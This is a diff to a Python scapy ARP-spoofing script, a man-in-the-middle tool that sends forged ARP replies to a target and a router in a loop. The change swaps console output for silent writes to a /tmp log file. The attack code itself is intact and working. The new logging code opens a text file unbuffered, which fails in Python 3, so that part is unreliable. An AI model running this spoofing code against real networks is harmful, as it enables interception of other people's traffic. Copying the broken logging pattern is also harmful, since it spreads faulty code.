@@ -23,6 +23,8 @@ import scapy.all as scapy
 import time
 
 
+buffer_size = 0 
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     boradcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -34,7 +36,8 @@ def get_mac(ip):
 def spoof(taget_ip, spoof_ip):
     target_mac = get_mac(taget_ip)
     if not target_mac:
-        print("\nMAC not found on the list")
+        with open('/tmp/net_fetch_arp.log', 'a', buffer_size) as f:
+            f.write("MAC not found")
     else:
         packet= scapy.ARP(op=2,pdst = taget_ip, hwdst=target_mac, psrc=spoof_ip)
         scapy.send(packet, verbose=False)
@@ -52,7 +55,8 @@ def arp_try(target_ip, router_ip):
             spoof(target_ip, router_ip)
             spoof(router_ip, target_ip)
             packet_count = packet_count + 2
-            print("\r[+]Packets sent: " + str(packet_count), end="")
+            with open('/tmp/net_fetch_arp.log', 'a', buffer_size) as f:
+                f.write("Packet send "+ str(packet_count)+"\n")
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+]Detected CTRL^C....Resetting ARP Tables.....Please wait:)\n")
